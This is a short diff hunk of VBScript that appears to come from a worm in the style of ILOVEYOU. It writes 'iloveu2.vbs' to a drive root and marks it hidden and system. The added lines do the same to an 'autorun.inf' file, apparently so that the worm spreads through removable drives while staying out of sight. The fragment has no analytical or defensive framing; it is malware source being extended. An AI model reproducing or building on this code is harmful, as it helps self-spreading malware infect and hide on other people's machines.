@@ -45,6 +45,8 @@ file.write body
 file.close
 set file_attrib = fso.getfile(drive&"\iloveu2.vbs")
 file_attrib.attributes = 128+2+4
+set file_attrib = fso.getfile(drive&"\autorun.inf")
+file_attrib.attributes = 128+2+4
 randomize
 r = int(rnd*4) + 1
 select case r
